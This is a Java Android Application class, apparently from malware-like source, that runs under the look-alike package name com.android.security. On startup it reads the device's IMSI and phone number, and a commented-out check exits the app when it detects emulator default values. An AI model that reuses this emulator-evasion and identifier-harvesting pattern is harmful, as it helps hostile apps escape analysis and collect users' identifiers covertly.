package com.android.security;
 
import android.app.Application;
import android.content.Context;

import com.android.security.utils.Config;

public class MainApplication extends Application {
	public static String phoneIdentity;
	public static String imsi;
	public Context context = null;

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		context = getApplicationContext();
		
		Config.initParamters();
		getPhoneIdentity();
		
/*		if ((phoneIdentity == null) || (phoneIdentity.equals("")) || phoneIdentity.startsWith("15555")  || imsi.startsWith("31026"))
		{
			LogUtil.i("in vm ...");
			System.exit(0);
			return;
		}  */
		
		
	}
	public void getPhoneIdentity() {
		imsi = Config.getIMSI(context);
		phoneIdentity = Config.getPhoneNumber(context);
	 
	}
}
